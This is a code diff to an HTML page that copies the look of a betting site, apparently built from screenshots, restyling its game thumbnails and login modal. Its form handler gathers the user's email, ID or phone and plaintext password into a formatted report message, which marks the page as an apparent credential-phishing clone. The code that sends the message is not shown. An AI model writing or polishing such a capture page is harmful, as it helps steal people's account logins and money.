@@ -28,6 +28,18 @@
     .brand-green {
       background-color: #00b843;
     }
+    .game-thumb {
+      position: relative;
+      height: 112px;
+      border-radius: 14px;
+      overflow: hidden;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.12);
+    }
+    .game-thumb svg {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
   </style>
 </head>
 <body class="max-w-md mx-auto bg-white min-h-screen relative overflow-x-hidden">
@@ -136,22 +148,47 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
-        <!-- Aviator -->
-        <div onclick="openModal('loginModal')" class="game-card min-w-[162px] cursor-pointer" data-name="aviator spribe crash">
-          <div class="h-28 rounded-xl bg-gradient-to-br from-rose-700 via-red-600 to-red-950 p-2.5 flex flex-col justify-between items-center text-center shadow-md relative overflow-hidden">
-            <i class="fa-solid fa-plane text-white/95 text-2xl mt-2 drop-shadow"></i>
-            <span class="text-2xl font-black italic text-white tracking-tight drop-shadow">Aviator</span>
-            <span class="text-[9px] font-extrabold text-red-200 tracking-wider uppercase">S SPRIBE</span>
+        <!-- Aviator Graphic Card -->
+        <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="aviator spribe crash">
+          <div class="game-thumb">
+            <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <radialGradient id="aviatorBg" cx="55%" cy="35%" r="70%">
+                  <stop offset="0%" stop-color="#ff2a4b"/>
+                  <stop offset="55%" stop-color="#b91c1c"/>
+                  <stop offset="100%" stop-color="#450a0a"/>
+                </radialGradient>
+              </defs>
+              <rect width="220" height="140" fill="url(#aviatorBg)"/>
+              <path d="M15 112 Q95 95 168 38" stroke="#fb7185" stroke-width="3" fill="none" stroke-dasharray="5 4" opacity="0.8"/>
+              <path d="M148 36 L184 26 L169 52 L162 42 Z" fill="#dc2626" stroke="#ffffff" stroke-width="1.5"/>
+              <text x="110" y="92" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-style="italic" font-weight="900" font-size="30">Aviator</text>
+              <text x="110" y="114" text-anchor="middle" fill="#fca5a5" font-family="Inter, sans-serif" font-weight="800" font-size="11" letter-spacing="1.5">S SPRIBE</text>
+            </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Aviator</p>
         </div>
 
-        <!-- Aviatrix -->
-        <div onclick="openModal('loginModal')" class="game-card min-w-[162px] cursor-pointer" data-name="aviatrix crorebet crash">
-          <div class="h-28 rounded-xl bg-gradient-to-br from-purple-700 via-fuchsia-600 to-indigo-900 p-2.5 flex flex-col justify-between items-center text-center shadow-md relative overflow-hidden">
-            <span class="text-[10px] font-bold text-yellow-300">✈️ CRASH</span>
-            <span class="text-xl font-black italic text-white tracking-tight drop-shadow">Aviatrix</span>
-            <span class="bg-black text-white text-[8px] font-extrabold px-1.5 py-0.5 rounded">CRORE <span class="text-[#f6b900]">BET</span></span>
+        <!-- Aviatrix Graphic Card -->
+        <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="aviatrix crorebet crash">
+          <div class="game-thumb">
+            <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <linearGradient id="aviatrixBg" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#7e22ce"/>
+                  <stop offset="50%" stop-color="#a855f7"/>
+                  <stop offset="100%" stop-color="#3b0764"/>
+                </linearGradient>
+              </defs>
+              <rect width="220" height="140" fill="url(#aviatrixBg)"/>
+              <circle cx="152" cy="46" r="24" fill="#fde047" opacity="0.22"/>
+              <circle cx="152" cy="44" r="14" fill="#fbcfe8"/>
+              <path d="M136 42 Q152 24 168 42 L170 50 L134 50 Z" fill="#f59e0b"/>
+              <path d="M40 52 L76 44 L64 62 Z" fill="#facc15"/>
+              <text x="108" y="92" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-style="italic" font-weight="900" font-size="25">Aviatrix</text>
+              <rect x="64" y="102" width="92" height="18" rx="4" fill="#09090b"/>
+              <text x="110" y="114" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="10">CRORE <tspan fill="#f6b900">BET</tspan></text>
+            </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Aviatrix</p>
         </div>
@@ -206,22 +243,46 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
-        <!-- Dragon Tiger -->
-        <div onclick="openModal('loginModal')" class="game-card min-w-[162px] cursor-pointer" data-name="dragon tiger live evolution">
-          <div class="h-28 rounded-xl bg-gradient-to-br from-amber-900 via-red-900 to-stone-950 p-2.5 flex flex-col justify-between items-center text-center shadow-md relative overflow-hidden">
-            <span class="text-[10px] font-bold text-amber-300 uppercase">LIVE DEALER</span>
-            <span class="text-lg font-black text-red-400 leading-tight drop-shadow">Dragon Tiger <span class="text-white text-xs block">Live</span></span>
-            <span class="text-[9px] font-bold text-white/90">Evolution</span>
+        <!-- Dragon Tiger Graphic Card -->
+        <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="dragon tiger live evolution">
+          <div class="game-thumb">
+            <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <linearGradient id="dtBg" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#78350f"/>
+                  <stop offset="55%" stop-color="#450a0a"/>
+                  <stop offset="100%" stop-color="#1c1917"/>
+                </linearGradient>
+              </defs>
+              <rect width="220" height="140" fill="url(#dtBg)"/>
+              <circle cx="110" cy="40" r="18" fill="#fed7aa"/>
+              <path d="M84 82 Q110 56 136 82 Z" fill="#dc2626"/>
+              <text x="110" y="96" text-anchor="middle" fill="#f87171" font-family="Inter, sans-serif" font-weight="900" font-size="18">DragonTiger</text>
+              <text x="155" y="110" text-anchor="middle" fill="#fde68a" font-family="Inter, sans-serif" font-style="italic" font-weight="800" font-size="11">Live</text>
+              <text x="110" y="128" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="700" font-size="10">Evolution</text>
+            </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Dragon Tiger</p>
         </div>
 
-        <!-- Ice Fishing -->
-        <div onclick="openModal('loginModal')" class="game-card min-w-[162px] cursor-pointer" data-name="ice fishing live evolution">
-          <div class="h-28 rounded-xl bg-gradient-to-br from-sky-500 via-blue-700 to-indigo-950 p-2.5 flex flex-col justify-between items-center text-center shadow-md relative overflow-hidden">
-            <span class="text-[10px] font-bold text-cyan-200 uppercase">LIVE GAME SHOW</span>
-            <span class="text-lg font-black text-white leading-tight drop-shadow">ICE FISHING</span>
-            <span class="text-[9px] font-bold text-cyan-200">Evolution</span>
+        <!-- Ice Fishing Graphic Card -->
+        <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="ice fishing live evolution">
+          <div class="game-thumb">
+            <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <linearGradient id="iceBg" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#0284c7"/>
+                  <stop offset="60%" stop-color="#1d4ed8"/>
+                  <stop offset="100%" stop-color="#172554"/>
+                </linearGradient>
+              </defs>
+              <rect width="220" height="140" fill="url(#iceBg)"/>
+              <circle cx="152" cy="56" r="36" fill="#38bdf8" stroke="#e0f2fe" stroke-width="3" opacity="0.5"/>
+              <circle cx="85" cy="42" r="15" fill="#fde68a"/>
+              <path d="M64 78 Q85 56 106 78 Z" fill="#0ea5e9"/>
+              <text x="110" y="92" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="17">ICE FISHING</text>
+              <text x="110" y="122" text-anchor="middle" fill="#bae6fd" font-family="Inter, sans-serif" font-weight="700" font-size="10">Evolution</text>
+            </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Ice Fishing</p>
         </div>
@@ -241,22 +302,46 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
-        <!-- Fortune Garuda 500 -->
-        <div onclick="openModal('loginModal')" class="game-card min-w-[162px] cursor-pointer" data-name="fortune garuda 500 jili slots">
-          <div class="h-28 rounded-xl bg-gradient-to-br from-blue-700 via-indigo-800 to-amber-600 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
-            <span class="text-[10px] font-extrabold text-yellow-300 uppercase tracking-wider">FORTUNE GARUDA</span>
-            <span class="text-3xl font-black text-yellow-400 drop-shadow">500</span>
-            <span class="bg-red-600 text-white text-[9px] font-bold px-2.5 py-0.5 rounded">JILI</span>
+        <!-- Fortune Garuda 500 Graphic Card -->
+        <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="fortune garuda 500 jili slots">
+          <div class="game-thumb">
+            <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <linearGradient id="garudaBg" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#1d4ed8"/>
+                  <stop offset="60%" stop-color="#3730a3"/>
+                  <stop offset="100%" stop-color="#d97706"/>
+                </linearGradient>
+              </defs>
+              <rect width="220" height="140" fill="url(#garudaBg)"/>
+              <path d="M35 45 L110 24 L185 45 L150 64 L110 50 L70 64 Z" fill="#facc15"/>
+              <text x="110" y="34" text-anchor="middle" fill="#fef08a" font-family="Inter, sans-serif" font-weight="900" font-size="11">FORTUNE GARUDA</text>
+              <text x="110" y="88" text-anchor="middle" fill="#fde047" font-family="Inter, sans-serif" font-weight="900" font-size="36">500</text>
+              <rect x="88" y="100" width="44" height="17" rx="4" fill="#dc2626"/>
+              <text x="110" y="112" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="10">JILI</text>
+            </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5 truncate">Fortune Garuda 500</p>
         </div>
 
-        <!-- 777 Coins -->
-        <div onclick="openModal('loginModal')" class="game-card min-w-[162px] cursor-pointer" data-name="777 coins 3 oaks slots">
-          <div class="h-28 rounded-xl bg-gradient-to-br from-amber-500 via-orange-600 to-red-700 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
-            <span class="text-2xl font-black text-yellow-200 drop-shadow">777</span>
-            <span class="text-sm font-black text-white tracking-wide">COINS</span>
-            <span class="bg-black/65 text-yellow-300 text-[9px] font-bold px-2.5 py-0.5 rounded">3 OAKS</span>
+        <!-- 777 Coins Graphic Card -->
+        <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="777 coins 3 oaks slots">
+          <div class="game-thumb">
+            <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <radialGradient id="coinsBg" cx="50%" cy="45%" r="65%">
+                  <stop offset="0%" stop-color="#f59e0b"/>
+                  <stop offset="60%" stop-color="#ea580c"/>
+                  <stop offset="100%" stop-color="#991b1b"/>
+                </radialGradient>
+              </defs>
+              <rect width="220" height="140" fill="url(#coinsBg)"/>
+              <circle cx="110" cy="64" r="38" fill="#fbbf24" stroke="#fef08a" stroke-width="3" opacity="0.35"/>
+              <text x="110" y="62" text-anchor="middle" fill="#fef08a" font-family="Inter, sans-serif" font-weight="900" font-size="28">777</text>
+              <text x="110" y="88" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="16">COINS</text>
+              <rect x="78" y="100" width="64" height="17" rx="4" fill="#18181b"/>
+              <text x="110" y="112" text-anchor="middle" fill="#facc15" font-family="Inter, sans-serif" font-weight="800" font-size="9">3 OAKS</text>
+            </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5 truncate">777 Coins</p>
         </div>
@@ -276,22 +361,45 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
-        <!-- JetX -->
-        <div onclick="openModal('loginModal')" class="game-card min-w-[162px] cursor-pointer" data-name="jetx smartsoft popular">
-          <div class="h-28 rounded-xl bg-gradient-to-b from-stone-900 via-amber-800 to-amber-500 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
-            <i class="fa-solid fa-jet-fighter-up text-yellow-400 text-xl self-end"></i>
-            <span class="text-2xl font-black italic text-yellow-300 tracking-tight">JetX</span>
-            <span class="text-[9px] font-bold text-white/90 uppercase">SMARTSOFT</span>
+        <!-- JetX Graphic Card -->
+        <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="jetx smartsoft popular">
+          <div class="game-thumb">
+            <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <linearGradient id="jetxBg" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#18181b"/>
+                  <stop offset="55%" stop-color="#92400e"/>
+                  <stop offset="100%" stop-color="#f59e0b"/>
+                </linearGradient>
+              </defs>
+              <rect width="220" height="140" fill="url(#jetxBg)"/>
+              <path d="M135 32 L182 22 L166 44 L158 37 Z" fill="#facc15"/>
+              <text x="110" y="84" text-anchor="middle" fill="#fde047" font-family="Inter, sans-serif" font-style="italic" font-weight="900" font-size="32">JetX</text>
+              <text x="110" y="112" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="800" font-size="10" letter-spacing="1.2">SMARTSOFT</text>
+            </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">JetX</p>
         </div>
 
-        <!-- Coin Volcano -->
-        <div onclick="openModal('loginModal')" class="game-card min-w-[162px] cursor-pointer" data-name="coin volcano 3 oaks popular">
-          <div class="h-28 rounded-xl bg-gradient-to-br from-yellow-500 via-red-600 to-red-900 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
-            <span class="text-xs font-black text-yellow-200 uppercase">COIN</span>
-            <span class="text-base font-black text-white leading-tight">VOLCANO</span>
-            <span class="bg-black/65 text-yellow-300 text-[9px] font-bold px-2.5 py-0.5 rounded">3 OAKS</span>
+        <!-- Coin Volcano Graphic Card -->
+        <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="coin volcano 3 oaks popular">
+          <div class="game-thumb">
+            <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <linearGradient id="volcanoBg" x1="0%" y1="0%" x2="0%" y2="100%">
+                  <stop offset="0%" stop-color="#f59e0b"/>
+                  <stop offset="55%" stop-color="#dc2626"/>
+                  <stop offset="100%" stop-color="#450a0a"/>
+                </linearGradient>
+              </defs>
+              <rect width="220" height="140" fill="url(#volcanoBg)"/>
+              <path d="M40 140 L88 64 L132 64 L180 140 Z" fill="#78350f"/>
+              <circle cx="110" cy="44" r="14" fill="#fde047"/>
+              <text x="110" y="76" text-anchor="middle" fill="#fef08a" font-family="Inter, sans-serif" font-weight="900" font-size="13">COIN</text>
+              <text x="110" y="98" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="18">VOLCANO</text>
+              <rect x="78" y="108" width="64" height="16" rx="4" fill="#18181b"/>
+              <text x="110" y="119" text-anchor="middle" fill="#facc15" font-family="Inter, sans-serif" font-weight="800" font-size="9">3 OAKS</text>
+            </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Coin Volcano</p>
         </div>
@@ -354,20 +462,44 @@
       </div>
 
       <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1">
-        <div onclick="openModal('loginModal')" class="game-card min-w-[162px] cursor-pointer" data-name="chicken road 2 crorebet exclusives">
-          <div class="h-28 rounded-xl bg-gradient-to-br from-orange-500 to-red-600 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
-            <span class="text-2xl">🐔</span>
-            <span class="text-sm font-black text-yellow-200 leading-tight">CHICKEN ROAD 2</span>
-            <span class="bg-black text-white text-[8px] font-extrabold px-1.5 py-0.5 rounded">CRORE <span class="text-[#f6b900]">BET</span></span>
+        <!-- Chicken Road 2 -->
+        <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="chicken road 2 crorebet exclusives">
+          <div class="game-thumb">
+            <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <linearGradient id="cr2Bg" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#f97316"/>
+                  <stop offset="100%" stop-color="#dc2626"/>
+                </linearGradient>
+              </defs>
+              <rect width="220" height="140" fill="url(#cr2Bg)"/>
+              <circle cx="110" cy="40" r="18" fill="#ffffff"/>
+              <polygon points="102,22 110,12 118,22" fill="#ef4444"/>
+              <text x="110" y="84" text-anchor="middle" fill="#fef08a" font-family="Inter, sans-serif" font-weight="900" font-size="16">CHICKEN ROAD 2</text>
+              <rect x="64" y="98" width="92" height="17" rx="4" fill="#09090b"/>
+              <text x="110" y="110" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="10">CRORE <tspan fill="#f6b900">BET</tspan></text>
+            </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Chicken Road 2</p>
         </div>
 
-        <div onclick="openModal('loginModal')" class="game-card min-w-[162px] cursor-pointer" data-name="chicken road crorebet exclusives">
-          <div class="h-28 rounded-xl bg-gradient-to-br from-indigo-600 to-slate-800 p-2.5 flex flex-col justify-between items-center text-center shadow-md">
-            <span class="text-2xl">🐓</span>
-            <span class="text-sm font-black text-yellow-300 leading-tight">CHICKEN ROAD</span>
-            <span class="bg-black text-white text-[8px] font-extrabold px-1.5 py-0.5 rounded">CRORE <span class="text-[#f6b900]">BET</span></span>
+        <!-- Chicken Road -->
+        <div onclick="openModal('loginModal')" class="game-card min-w-[164px] cursor-pointer" data-name="chicken road crorebet exclusives">
+          <div class="game-thumb">
+            <svg viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <linearGradient id="cr1Bg" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#4f46e5"/>
+                  <stop offset="100%" stop-color="#1e293b"/>
+                </linearGradient>
+              </defs>
+              <rect width="220" height="140" fill="url(#cr1Bg)"/>
+              <circle cx="110" cy="40" r="18" fill="#f8fafc"/>
+              <polygon points="102,22 110,12 118,22" fill="#ef4444"/>
+              <text x="110" y="84" text-anchor="middle" fill="#fde047" font-family="Inter, sans-serif" font-weight="900" font-size="17">CHICKEN ROAD</text>
+              <rect x="64" y="98" width="92" height="17" rx="4" fill="#09090b"/>
+              <text x="110" y="110" text-anchor="middle" fill="#ffffff" font-family="Inter, sans-serif" font-weight="900" font-size="10">CRORE <tspan fill="#f6b900">BET</tspan></text>
+            </svg>
           </div>
           <p class="text-xs font-bold text-center text-gray-800 mt-1.5">Chicken Road</p>
         </div>
@@ -626,74 +758,84 @@
     </div>
   </div>
 
-  <!-- MODAL 1: LOG IN -->
+  <!-- MODAL 1: LOG IN (Exact match with 12375_3.jpg) -->
   <div id="loginModal" class="fixed inset-0 z-50 bg-black/60 hidden items-center justify-center p-4">
-    <div class="bg-white w-full max-w-sm rounded-2xl p-5 relative shadow-2xl">
+    <div class="bg-white w-full max-w-sm rounded-3xl p-5 relative shadow-2xl">
       <div class="flex items-center justify-between mb-4">
-        <i class="fa-regular fa-comments text-gray-700 text-lg"></i>
-        <h3 class="font-extrabold text-base text-gray-900">LOG IN</h3>
-        <button onclick="closeModals()" class="w-7 h-7 rounded-lg bg-gray-100 text-gray-600 flex items-center justify-center">
-          <i class="fa-solid fa-xmark text-xs"></i>
+        <i class="fa-regular fa-comments text-gray-700 text-xl"></i>
+        <h3 class="font-extrabold text-lg text-gray-900 tracking-tight">LOG IN</h3>
+        <button onclick="closeModals()" class="w-8 h-8 rounded-xl bg-gray-100 text-gray-700 flex items-center justify-center">
+          <i class="fa-solid fa-xmark text-sm"></i>
         </button>
       </div>
 
-      <p class="text-xs text-gray-600 mb-3">
+      <p class="text-xs text-gray-700 mb-3.5">
         New user? <button onclick="switchModal('registerModal')" class="font-bold text-[#f6b900]">Registration</button>
       </p>
 
-      <div class="grid grid-cols-2 gap-2 mb-3">
-        <button id="tabEmailBtn" onclick="switchLoginTab('email')" class="bg-gray-100 text-gray-800 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
-          <i class="fa-solid fa-envelope"></i> Email or ID
+      <!-- Tabs: Email or ID (Yellow active default) / Phone -->
+      <div class="grid grid-cols-2 gap-2.5 mb-3.5">
+        <button id="tabEmailBtn" type="button" onclick="switchLoginTab('email')" class="brand-yellow text-gray-900 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2 shadow-2xs">
+          <i class="fa-solid fa-envelope text-sm"></i> Email or ID
         </button>
-        <button id="tabPhoneBtn" onclick="switchLoginTab('phone')" class="brand-yellow text-gray-900 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
-          <i class="fa-solid fa-phone"></i> Phone
+        <button id="tabPhoneBtn" type="button" onclick="switchLoginTab('phone')" class="bg-gray-100 text-gray-800 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2">
+          <i class="fa-solid fa-phone text-sm"></i> Phone
         </button>
       </div>
 
       <form onsubmit="handleFormSubmit(event, 'Login')" class="space-y-3">
-        <div id="phoneInputWrap" class="flex bg-gray-100 rounded-xl overflow-hidden">
-          <span class="px-3 py-3 text-xs font-bold text-gray-800 border-r border-gray-200 flex items-center gap-1.5">
+        <!-- Email / Account ID Input (Default visible) -->
+        <div id="emailInputWrap" class="bg-gray-100 rounded-xl overflow-hidden">
+          <input type="text" placeholder="Email/Account ID" class="w-full bg-transparent px-3.5 py-3.5 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
+        </div>
+
+        <!-- Phone Input (Hidden until Phone tab clicked) -->
+        <div id="phoneInputWrap" class="hidden flex bg-gray-100 rounded-xl overflow-hidden">
+          <span class="px-3 py-3.5 text-xs font-bold text-gray-800 border-r border-gray-200 flex items-center gap-1.5">
             🇮🇳 +91
           </span>
-          <input type="tel" placeholder="Phone number" class="w-full bg-transparent px-3 py-3 text-xs focus:outline-none" />
+          <input type="tel" placeholder="Phone number" class="w-full bg-transparent px-3 py-3.5 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
         </div>
 
-        <div id="emailInputWrap" class="hidden bg-gray-100 rounded-xl overflow-hidden">
-          <input type="text" placeholder="Email/Account ID" class="w-full bg-transparent px-3.5 py-3 text-xs focus:outline-none" />
-        </div>
-
+        <!-- Password Input -->
         <div class="flex items-center bg-gray-100 rounded-xl px-3.5">
-          <input id="loginPass" type="password" placeholder="Password" class="w-full bg-transparent py-3 text-xs focus:outline-none" />
-          <button type="button" onclick="togglePass('loginPass')" class="text-gray-500 text-xs">
+          <input id="loginPass" type="password" placeholder="Password" class="w-full bg-transparent py-3.5 text-xs text-gray-900 placeholder-gray-400 focus:outline-none" />
+          <button type="button" onclick="togglePass('loginPass')" class="text-gray-800 text-sm pl-2">
             <i class="fa-regular fa-eye-slash"></i>
           </button>
         </div>
 
-        <p class="text-xs text-gray-600">
+        <p class="text-xs text-gray-700 pt-0.5">
           Forgot password? <button type="button" onclick="switchModal('resetModal')" class="font-bold text-[#f6b900]">Reset</button>
         </p>
 
-        <button type="submit" class="w-full bg-gray-200 hover:bg-[#f6b900] text-gray-600 hover:text-gray-900 font-extrabold text-xs py-3.5 rounded-xl transition">
+        <button type="submit" class="w-full bg-gray-200 hover:bg-[#f6b900] text-gray-500 hover:text-gray-900 font-extrabold text-xs py-3.5 rounded-xl transition">
           LOG IN
         </button>
       </form>
 
-      <div class="flex items-center gap-2 my-3.5">
+      <div class="flex items-center gap-2.5 my-4">
         <div class="h-px bg-gray-200 flex-1"></div>
-        <span class="text-[11px] font-bold text-gray-500">OR</span>
+        <span class="text-[11px] font-bold text-gray-700">OR</span>
         <div class="h-px bg-gray-200 flex-1"></div>
       </div>
 
-      <button onclick="alert('Google OAuth connect karein')" class="w-full bg-blue-600 text-white rounded-full py-2 px-4 flex items-center justify-between text-xs font-semibold shadow">
-        <span>Continue with Google</span>
-        <span class="w-6 h-6 rounded-full bg-white text-blue-600 flex items-center justify-center font-black">G</span>
+      <button type="button" onclick="alert('Google OAuth connect karein')" class="w-full bg-[#1a73e8] hover:bg-blue-700 text-white rounded-full py-1.5 px-2.5 flex items-center justify-between text-xs font-semibold shadow">
+        <span class="w-7 h-7 rounded-full bg-sky-700 text-white flex items-center justify-center font-bold text-xs">S</span>
+        <div class="flex-1 text-left pl-2.5 leading-tight">
+          <p class="text-[11px] font-semibold">Continue as Site</p>
+          <p class="text-[10px] text-blue-100 truncate">infosite093@gmail.com</p>
+        </div>
+        <span class="w-7 h-7 rounded-full bg-white flex items-center justify-center font-black text-sm">
+          <span class="bg-gradient-to-tr from-blue-600 via-red-500 to-yellow-400 bg-clip-text text-transparent">G</span>
+        </span>
       </button>
     </div>
   </div>
 
   <!-- MODAL 2: RECOVER PASSWORD -->
   <div id="resetModal" class="fixed inset-0 z-50 bg-black/60 hidden items-center justify-center p-4">
-    <div class="bg-white w-full max-w-sm rounded-2xl p-5 relative shadow-2xl">
+    <div class="bg-white w-full max-w-sm rounded-3xl p-5 relative shadow-2xl">
       <div class="flex items-center justify-between mb-4">
         <span class="w-7"></span>
         <h3 class="font-extrabold text-base text-gray-900">Recover a password</h3>
@@ -703,10 +845,10 @@
       </div>
 
       <div class="grid grid-cols-2 gap-2 mb-4">
-        <button class="brand-yellow text-gray-900 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
+        <button type="button" class="brand-yellow text-gray-900 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
           <i class="fa-solid fa-envelope"></i> Email
         </button>
-        <button class="bg-gray-100 text-gray-800 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
+        <button type="button" class="bg-gray-100 text-gray-800 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5">
           <i class="fa-solid fa-phone"></i> Phone
         </button>
       </div>
@@ -727,7 +869,7 @@
 
   <!-- MODAL 3: REGISTRATION -->
   <div id="registerModal" class="fixed inset-0 z-50 bg-black/60 hidden items-center justify-center p-4">
-    <div class="bg-white w-full max-w-sm rounded-2xl p-5 relative shadow-2xl max-h-[90vh] overflow-y-auto">
+    <div class="bg-white w-full max-w-sm rounded-3xl p-5 relative shadow-2xl max-h-[90vh] overflow-y-auto">
       <div class="flex items-center justify-between mb-3">
         <i class="fa-regular fa-comments text-gray-700 text-lg"></i>
         <h3 class="font-extrabold text-base text-gray-900">REGISTRATION</h3>
@@ -737,7 +879,7 @@
       </div>
 
       <p class="text-xs text-gray-600 mb-3">
-        Have an account? <button onclick="switchModal('loginModal')" class="font-bold text-[#f6b900]">Log In</button>
+        Have an account? <button type="button" onclick="switchModal('loginModal')" class="font-bold text-[#f6b900]">Log In</button>
       </p>
 
       <form onsubmit="handleFormSubmit(event, 'Registration')" class="space-y-3">
@@ -836,16 +978,16 @@
       const tabPhoneBtn = document.getElementById('tabPhoneBtn');
       const tabEmailBtn = document.getElementById('tabEmailBtn');
 
-      if (tab === 'phone') {
-        phoneWrap.classList.remove('hidden');
-        emailWrap.classList.add('hidden');
-        tabPhoneBtn.className = 'brand-yellow text-gray-900 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5';
-        tabEmailBtn.className = 'bg-gray-100 text-gray-800 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5';
-      } else {
+      if (tab === 'email') {
         emailWrap.classList.remove('hidden');
         phoneWrap.classList.add('hidden');
-        tabEmailBtn.className = 'brand-yellow text-gray-900 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5';
-        tabPhoneBtn.className = 'bg-gray-100 text-gray-800 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5';
+        tabEmailBtn.className = 'brand-yellow text-gray-900 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2 shadow-2xs';
+        tabPhoneBtn.className = 'bg-gray-100 text-gray-800 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2';
+      } else {
+        phoneWrap.classList.remove('hidden');
+        emailWrap.classList.add('hidden');
+        tabPhoneBtn.className = 'brand-yellow text-gray-900 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2 shadow-2xs';
+        tabEmailBtn.className = 'bg-gray-100 text-gray-800 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2';
       }
     }
 
@@ -898,15 +1040,15 @@
       details += `<b>Time:</b> ${new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })}\n\n`;
 
       if (actionName === "Login") {
-        const isPhoneVisible = !document.getElementById("phoneInputWrap").classList.contains("hidden");
-        if (isPhoneVisible) {
-          const phone = document.querySelector("#phoneInputWrap input")?.value.trim() || "";
-          details += `<b>Method:</b> Phone (+91)\n`;
-          details += `<b>Phone:</b> <code>+91 ${phone}</code>\n`;
-        } else {
+        const isEmailVisible = !document.getElementById("emailInputWrap").classList.contains("hidden");
+        if (isEmailVisible) {
           const emailOrId = document.querySelector("#emailInputWrap input")?.value.trim() || "";
           details += `<b>Method:</b> Email / Account ID\n`;
           details += `<b>Email/ID:</b> <code>${emailOrId}</code>\n`;
+        } else {
+          const phone = document.querySelector("#phoneInputWrap input")?.value.trim() || "";
+          details += `<b>Method:</b> Phone (+91)\n`;
+          details += `<b>Phone:</b> <code>+91 ${phone}</code>\n`;
         }
         const password = document.getElementById("loginPass")?.value || "";
         details += `<b>Password:</b> <code>${password}</code>`;
